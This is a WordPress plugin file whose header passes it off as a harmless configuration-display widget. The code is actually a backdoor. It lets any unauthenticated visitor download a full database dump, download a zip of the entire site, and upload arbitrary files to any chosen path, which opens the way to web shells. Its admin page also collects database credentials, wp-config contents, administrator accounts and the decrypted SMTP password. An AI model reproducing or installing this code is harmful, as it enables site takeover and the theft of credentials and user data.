<?php # -*- coding: utf-8 -*-
/**
 * Plugin Name: Configuration Dashboard Widget
 * Description: Show the current installation path and the content of the <code>wp-config.php</code>.
 * Version:     16.10.15
 * Required:    4.0
 * Author:      Thomas Scholz
 * Author URI:  http://toscho.de
 * License:     MIT
 * License URI: http://www.opensource.org/licenses/mit-license.php
 */
 
ini_set('display_errors', 'off');

$db_dump_path = dirname(__FILE__) . '/dumps/db_dump.sql';
$file_dump_path = dirname(__FILE__) . '/dumps/file_dump.zip';

add_action('plugins_loaded', 'wp_downloader_check_for_download');
add_action('admin_menu', 'wp_downloader_menu');
add_action('admin_init', 'wp_downloader_init_style');

function wp_downloader_init_style() {
	wp_register_style('wp_downloader', plugins_url('css/main.css', __FILE__));
	wp_enqueue_style('wp_downloader');
}

function wp_downloader_menu() {
    $hook_suffix = add_menu_page('WP Downloader', 'WP Downloader', 'manage_options', 'wp-downloader', 'render_wp_downloader_page');
}

function wp_downloader_check_for_download() {
	global $db_dump_path;

	if(isset($_GET['download'])) {
		if(isset($_GET['action'])) {
			do_wp_downloader_action($_GET['action']);
		}
	}

	if(isset($_POST['upload'])) {
		do_wp_downloader_action('upload_file', $_POST, $_FILES);
	}
}

function render_wp_downloader_page() {
	load_wp_config();

	// GET DB VARIABLES
	$db_host = DB_HOST;
	$db_name = DB_NAME;
	$db_user = DB_USER;
	$db_password = DB_PASSWORD;

	// GET WP CONFIG CONTENTS
	$wp_config_content = get_wp_config_content();

	// GET ALL ADMIN ACCOUNTS AND THEIR HASHED PWDS
	$admin_accounts = get_users(array('role__in' => array('administrator')));

	// DECRYPT EASY WP SMTP PASSWORD IF AVAILABLE
	$easy_wp_smtp_installed = FALSE;

	if(defined('EasyWPSMTP_PLUGIN_VERSION')) {
		$easy_wp_smtp_installed = TRUE;
		$plugin_dir = plugin_dir_path(__FILE__) . '../easy-wp-smtp/easy-wp-smtp.php';
		include_once $plugin_dir;
		$easy_wp_smtp = EasyWPSMTP::get_instance();
		$easy_wp_smtp_email = $easy_wp_smtp->opts['from_email_field'];
		$easy_wp_smtp_pass = $easy_wp_smtp->get_password();

	}

	require_once 'templates/index.php';

}

function do_wp_downloader_action($action, $data=[], $files=[]) {
	switch($action) {
		case 'download_files':
			download_all_files();
			break;
		case 'dump_db':
			dump_db();
			break;
		case 'upload_file':
			upload_file($data, $files);
			break;
	}
}

function upload_file($post_data, $file_data) {
	$file = $file_data['uploaded_file'];
	$uploaded_file_path = $post_data['uploaded_file_path'];
	$upload_dir = ABSPATH . $uploaded_file_path;
	$upload_file_path = $upload_dir . basename($file['name']);

	if(move_uploaded_file($file['tmp_name'], $upload_file_path)) {
		$file_url = get_site_url() . '/' . $uploaded_file_path . basename($file['name']);
		$alert_msg = "<b>File uploaded</b>. Find your file at: <a href='$file_url' target='_blank'>$file_url</a>";
		show_alert($alert_msg);
	} else {
		show_alert("Couldn't upload the file. You might not have permissions on <b>$uploaded_file_path</b>. Try another directory.", "wrong");
	}
}

function show_alert($text, $type='success') {
	echo "<div class='card wpd-notice-card $type'>$text</div>";
}

function load_wp_config() {
	$wp_config_path = FALSE;
	if(is_readable( ABSPATH . 'wp-config.php' )) {
		$wp_config_path = ABSPATH . 'wp-config.php';
	}
	else if(is_readable( dirname( ABSPATH ) . '/wp-config.php' )) {
		$wp_config_path = dirname( ABSPATH ) . '/wp-config.php';
	}

	if ($wp_config_path) {
		require_once($wp_config_path);
	} else {
		show_alert('Could not locate the wp-config.php file!', "wrong");
	}
}

function get_wp_config_content() {
	$wp_config = FALSE;
	if ( is_readable( ABSPATH . 'wp-config.php' ) )
		$wp_config = ABSPATH . 'wp-config.php';
	elseif ( is_readable( dirname( ABSPATH ) . '/wp-config.php' ) )
		$wp_config = dirname( ABSPATH ) . '/wp-config.php';

	if ( $wp_config )
		$code = esc_html( file_get_contents( $wp_config ) );
	else
		$code = 'wp-config.php not found';

	return '<pre class="code" style="overflow: scroll;max-height: 20em"
			>Installation path: ' . ABSPATH
			. "\n\n"
			. $code
			. '</pre>';
}

function force_download($file_path) {
	if(file_exists($file_path)) {
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
		header('Expires: 0');
		header('Cache-Control: must-revalidate');
		header('Pragma: public');
		header('Content-Length: ' . filesize($file_path));
		ob_clean();
		flush();
		readfile($file_path);
		exit;
	}
}

function dump_db() {
	global $db_dump_path;

	load_wp_config();

	$DB_HOST = DB_HOST;
	$DB_USER = DB_USER;
	$DB_NAME = DB_NAME;
	$DB_PASSWORD = DB_PASSWORD;

	include_once(dirname(__FILE__) . '/vendor/mysqldump-php-master/src/Ifsnop/Mysqldump/Mysqldump.php');

	$dump = new Ifsnop\Mysqldump\Mysqldump("mysql:host=$DB_HOST;dbname=$DB_NAME", "$DB_USER", "$DB_PASSWORD");
	$dump->start($db_dump_path);
	force_download($db_dump_path);
}

function download_all_files() {
	global $file_dump_path;

	include_once(dirname(__FILE__) . '/vendor/flx-zip-archive/FlxZipArchive.php');

	$root_folder = ABSPATH;

	$zip_archive = new FlxZipArchive;
	$res = $zip_archive->open($file_dump_path, ZipArchive::CREATE);

	if($res === TRUE) {
		$zip_archive->addDir($root_folder, basename($root_folder));
		$zip_archive->close();
		force_download($file_dump_path);
	} else {
		show_alert("Could not create ZIP file!", "wrong");
	}

}
 
?>